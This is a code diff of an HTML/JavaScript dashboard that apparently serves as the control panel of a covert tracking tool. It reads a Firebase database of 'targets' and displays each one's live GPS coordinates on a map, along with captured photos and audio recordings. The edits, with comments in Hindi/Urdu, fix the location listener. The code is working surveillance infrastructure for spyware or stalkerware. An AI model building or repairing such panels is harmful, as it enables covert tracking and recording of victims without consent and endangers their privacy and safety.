@@ -37,7 +37,7 @@
         <iframe id="map" width="100%" height="100%" frameborder="0" style="filter: grayscale(1) invert(1);"></iframe>
     </div>
     <div id="feed">
-        <div id="locInfo">Waiting for GPS...</div>
+        <div id="locInfo" style="color: #0f0; font-weight: bold; margin-bottom: 10px;">Waiting for GPS...</div>
         <hr>
         <h4>GALLERY</h4>
         <div id="gallery"></div>
@@ -49,12 +49,11 @@
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-    firebase.initializeApp(firebaseConfig);
+    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
 
     let currentTid = null;
 
-    // 1. Automatically fetch all targets
     db.ref('targets').on('value', snap => {
         const listDiv = document.getElementById('targetList');
         listDiv.innerHTML = "";
@@ -77,23 +76,26 @@
         document.getElementById('gallery').innerHTML = "";
         document.getElementById('audios').innerHTML = "";
         
-        // Listen for Location
-        db.ref('targets/' + id + '/location').on('value', s => {
-            const loc = s.val();
-            if(loc) {
-                document.getElementById('locInfo').innerText = `LAT: ${loc.lat} | LNG: ${loc.lng} | TIME: ${loc.last_seen}`;
-                document.getElementById('map').src = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
+        // --- FIXED LOCATION LISTENER ---
+        db.ref('targets/' + id + '/location').on('value', (snap) => {
+            const loc = snap.val();
+            if (loc) {
+                // locDisplay ki jagah locInfo use karein (jo HTML mein hai)
+                document.getElementById('locInfo').innerHTML = 
+                    `LAT: ${loc.lat} | LNG: ${loc.lng} <br> TIME: ${loc.last_seen || 'N/A'}`;
+                
+                // 1{loc.lat} ko theek karke standard Google Maps link banaya
+                const mapUrl = "https://maps.google.com/maps?q=" + loc.lat + "," + loc.lng + "&z=15&output=embed";
+                document.getElementById('map').src = mapUrl;
             }
         });
 
-        // Listen for Photos
         db.ref('targets/' + id + '/photos').on('child_added', s => {
             const img = document.createElement('img');
             img.src = s.val().img || s.val().image;
             document.getElementById('gallery').prepend(img);
         });
 
-        // Listen for Audio
         db.ref('targets/' + id + '/audios').on('child_added', s => {
             const aud = document.createElement('audio');
             aud.controls = true;
